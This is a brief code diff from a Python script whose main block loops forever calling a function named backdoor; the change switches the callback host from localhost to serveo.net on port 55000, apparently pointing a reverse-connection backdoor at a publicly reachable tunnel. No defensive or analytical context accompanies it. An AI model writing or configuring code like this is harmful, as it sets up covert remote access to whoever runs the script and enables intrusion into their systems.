@@ -174,7 +174,7 @@ if __name__ == "__main__":
             pass
 
         while True:
-            REMOTE_HOST = 'localhost'
+            REMOTE_HOST = 'serveo.net'
             REMOTE_PORT = 55000
 
             backdoor(REMOTE_HOST, REMOTE_PORT)
